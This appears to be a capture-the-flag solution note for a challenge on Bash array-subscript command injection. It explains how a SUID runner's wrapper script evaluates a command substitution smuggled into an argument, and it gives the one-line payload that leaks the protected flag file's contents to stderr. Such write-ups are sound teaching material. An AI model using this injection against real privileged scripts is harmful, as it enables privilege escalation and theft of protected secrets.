# SOLUTION - Challenge 05 : Array Interpolation / Quoted Injection
The SUID runner reads `/flag.txt`, stores its content in `$FLAG`, and then calls `wrapper.sh` with that argument. Inside the script, `-v "scores[a[$(echo $FLAG >&2)]]"` evaluates the command substitution, causing `$FLAG` to be printed to `stderr`.
```
./runner 'a[$(echo $FLAG >&2)]'
```

